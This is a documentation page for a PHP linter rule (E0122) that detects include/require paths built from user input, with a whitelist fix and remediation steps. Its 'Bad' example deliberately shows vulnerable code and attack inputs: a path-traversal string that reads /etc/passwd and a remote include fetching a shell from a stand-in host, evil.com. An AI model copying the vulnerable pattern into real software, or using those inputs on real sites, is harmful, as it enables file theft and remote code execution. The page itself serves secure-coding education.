# E0122: File inclusion with user input

**In plain English:** `include` or `require` is called with a path built from user-controlled input, allowing an attacker to include arbitrary local or remote files.

**Why it matters:** File inclusion with user input can:
- Include and execute malicious PHP files (local or remote)
- Read sensitive files (`/etc/passwd`, source code, config files)
- Achieve remote code execution

## Bad

```php
$page = $_GET['page'] ?? '';
include "/var/www/pages/$page.php";
// ?page=../../../etc/passwd or ?page=http://evil.com/shell
```

## Good

```php
$page = $_GET['page'] ?? '';
$allowed = ['home', 'about', 'contact'];
if (!in_array($page, $allowed, true)) {
    $page = 'home';
}
include "/var/www/pages/$page.php";
```

## What the rule checks

- `include`, `require`, `include_once`, `require_once` with paths containing tainted input
- `$_GET`, `$_POST`, `$_REQUEST`, `$_COOKIE` values used directly in include paths

## When it does not report

- Whitelist validation of the included file name
- Paths resolved to a fixed directory with `realpath()` verification

## How to fix

1. Never include files based directly on user input
2. Use a whitelist of allowed files/pages
3. Use absolute paths within your application directory
4. Set `allow_url_fopen = Off` in php.ini

## Configuration

E0122 is enabled by default and has no configuration options.
